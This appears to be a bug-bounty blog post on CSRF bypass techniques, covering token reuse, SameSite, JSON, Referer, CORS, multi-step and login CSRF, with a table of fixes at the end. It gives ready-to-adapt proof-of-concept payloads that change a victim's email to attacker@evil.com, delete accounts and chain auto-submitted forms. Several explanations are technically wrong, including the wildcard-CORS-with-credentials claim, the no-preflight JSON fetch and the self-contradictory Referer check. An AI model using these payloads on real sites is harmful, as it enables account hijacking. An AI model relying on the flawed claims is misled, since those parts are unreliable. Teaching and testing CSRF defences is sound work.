---
title: "CSRF Bypass Techniques (Deep Dive)"
date: 2025-07-17 00:00:00 +0530
categories: [Vulnerability, CSRF]
tags: [Pentesting, Bug Bounty, CSRF, Vulnerability]
---

### What We’re Targeting

These are cases where:

-   A CSRF token is **present but flawed**
-   Cookies are **misconfigured** (`SameSite`, `Secure`, etc.)
-   **Referer / Origin headers** are relied on—but can be bypassed
-   Application behavior allows **leakage or reuse**

### Bypass Techniques Overview

| Technique |Protection Bypassed | Scenario |
|--|--|
|1. Token Reuse or Leak  | Static or predictable CSRF tokens | Token is same across users or pages |
|2. Misconfigured SameSite | SameSite set to None or missing | Cookies sent in cross-origin requests
|3. JSON CSRF | Tokens not enforced on application/json | No CORS preflight + cookies auto-sent
|4. Referer Header Bypass | Server uses referer as CSRF check | Header can be spoofed in some edge cases
|5. CORS Misconfiguration| Trusts Origin without validating Credentials | Requests with cookies from cross-origin go through
|6. Multi-step CSRF | Each request step is CSRF-safe but chain allows state-change | Combine endpoints
|7. Login CSRF | CSRF used on login to set known creds | No anti-CSRF on login form

### 1. Token Reuse or Leakage
###  Scenario:
The CSRF token is:

-   Static for the user session
-   Embedded in HTML and exposed via GET
-   Not bound to the user (or action)

###  Example :
```html
<input type="hidden" name="csrf_token" value="123456"/>
```
-   Use Burp to capture the token
-   Reuse it in CSRF PoC

### Endpoint :
```html
POST /account/update-email 
csrf_token=123456&email=attacker@evil.com
```
### Impact :
If an attacker can **obtain or guess** the token, they can send a CSRF request with a valid token and bypass protection.

### 2. SameSite Cookie Misconfig

### Scenario :

Cookie is not marked as `SameSite` or is set to `SameSite=None` without `Secure`.

```bash
Set-Cookie: session=xyz; SameSite=None
```

###  Endpoint:

```html
POST /user/change-password
```

- Test using your CSRF PoC : if cookies are sent, this may work.

### Impact :

**Login session** is used in a forged request from another origin.

### 3. JSON CSRF (a.k.a. JSON Hijacking)

###  Scenario :

Application uses JSON API:

```
POST /api/change-email
Content-Type: application/json
```

Protection fails if :

-   Token is not required
-   CORS not enforced correctly

Browser auto-sends cookies even for JSON unless:

-   `SameSite` blocks it
-   CORS blocks it

###  Trick :

Use JavaScript to submit JSON:

```js
fetch('<https://target.com/api/change-email>', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({email: "attacker@evil.com"})
});

```

###  Impact :

Full API control via CSRF — often works if **backend has weak CORS + no token**.


## 4. Referer Header Check Bypass

### Scenario :

App validates the `Referer` or `Origin` headers to allow the request.

```html
Referer: <https://target.com/account/change-password> 
```

### But :

-   Old browsers/extensions can leak referer
-   Some misconfigured proxies allow header manipulation
-   Intra-site redirection tricks can be used

###  Trick :

Host a redirector on a subdomain like:

```
evil.target.com → redirects to /account/update?csrf_payload

```

Then the Referer becomes: `https://evil.target.com`

If the backend only checks:

```
Referer.startsWith("<https://target.com>")
```

- It fails.

### 5. CORS Misconfiguration

###  Scenario :

-   App allows cross-origin `POST`
-   `Access-Control-Allow-Origin: *`
-   Cookies sent with request (missing `Access-Control-Allow-Credentials: true` block)

###  Trick :

Craft a `fetch()` request to sensitive endpoint with credentials:

```jsx
fetch("<https://target.com/api/delete-account>", {
  method: "POST",
  credentials: "include",
});
```

###  Impact :

CORS + CSRF = full account hijack.

###  6. Multi-Step CSRF

###  Scenario :

1.  Step 1: `GET /start-change` — CSRF-safe
2.  Step 2: `POST /confirm-change` — lacks protection

###  Trick :

Auto-submit both steps from your page :

```html
<iframe src="<https://target.com/start-change>" onload="step2()"></iframe>

<script>
  function step2() {
    var f = document.createElement("form");
    f.method = "POST";
    f.action = "<https://target.com/confirm-change>";
    f.innerHTML = '<input name="confirm" value="yes">';
    document.body.appendChild(f);
    f.submit();
  }
</script>
```

###  Impact :

By chaining steps, attacker executes a CSRF that bypasses step-based protections.

### 7. Login CSRF

###  Scenario :

If a site **allows login via POST**, and doesn’t have CSRF protection on login form, an attacker can:

-   Force login with attacker creds
-   Victim’s session is now authenticated as attacker

```html
<form method="POST" action="<https://target.com/login>">
  <input name="username" value="attacker">
  <input name="password" value="123456">
</form>
```

###  Impact :

-   Session fixation
-   Victim uses attacker account
-   Attacker gains indirect access to victim’s actions

###  Testing Tips : 

```
Burp Suite                >         Intercept and repeat POSTs, modify CSRF tokens
DevTools                  >         Observe network requests, token presence
Cookie Editor             >         View and edit SameSite attributes
Custom HTML PoC           >         Test auto-submission
Firefox Multi-Container   >         Simulate cross-origin sessions
```
### Summary


|Bypass Technique | Bypasses | Fix |
|--|--|
|1. Reusable Token | Token mismanagement | Per-request, per-user token |
|2. Missing/Weak SameSite | Cross-origin cookie leakage | Set SameSite=Strict
|3. JSON CSRF | API not protected | CSRF token for all state-changing requests
|4. Referer/Origin Weak Check | SHeader spoofing/redirection | Use CSRF tokens instead
|5. Misconfigured CORS | Open CORS + cookies | Disallow credentials or restrict origins
|6. Multi-step | No token on one step | Token on every state-changing step
|7. Login CSRF | No CSRF on login | CSRF tokens for login too
